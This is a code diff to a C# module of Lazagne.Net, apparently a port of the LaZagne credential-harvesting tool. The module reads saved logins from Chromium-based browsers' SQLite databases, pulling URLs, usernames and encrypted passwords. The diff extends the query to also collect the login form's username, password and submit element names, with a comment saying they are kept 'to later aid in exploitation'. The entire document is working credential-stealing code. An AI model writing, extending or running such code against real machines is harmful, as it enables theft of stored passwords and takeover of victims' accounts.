@@ -29,7 +29,7 @@ namespace Lazagne.Net.Modules.ChromiumBased
             if (connection.State != System.Data.ConnectionState.Open)
                 throw new InvalidOperationException("Connection not ready");
 
-            using SQLiteCommand cmd = new SQLiteCommand("SELECT blacklisted_by_user, action_url, signon_realm, username_value, password_value FROM logins", connection);
+            using SQLiteCommand cmd = new SQLiteCommand("SELECT blacklisted_by_user, action_url, signon_realm, username_value, password_value, username_element, password_element, submit_element FROM logins", connection);
             using SQLiteDataReader reader = cmd.ExecuteReader();
 
             while (reader.Read())
@@ -54,11 +54,19 @@ namespace Lazagne.Net.Modules.ChromiumBased
                 byte[] encryptedPassword = new byte[length];
                 reader.GetBytes(4, 0, encryptedPassword, 0, length);
 
+                Dictionary<string, string> additional = new Dictionary<string, string> // Store the corresponding elements aswell to later aid in exploitation
+                {
+                    {"username_element", reader.GetString(5) },
+                    {"password_element", reader.GetString(6) },
+                    {"submit_element", reader.GetString(7) },
+                };
+
                 yield return new EncryptedLoginInfo()
                 {
                     Url = url,
                     Login = reader.GetString(3),
-                    EncryptedPassword = encryptedPassword
+                    EncryptedPassword = encryptedPassword,
+                    AdditionalData = additional
                 };
             }
         }
@@ -76,5 +84,6 @@ namespace Lazagne.Net.Modules.ChromiumBased
         public string Url { get; set; }
         public string Login { get; set; }
         public byte[] EncryptedPassword { get; set; }
+        public Dictionary<string, string> AdditionalData { get; set; }
     }
 }
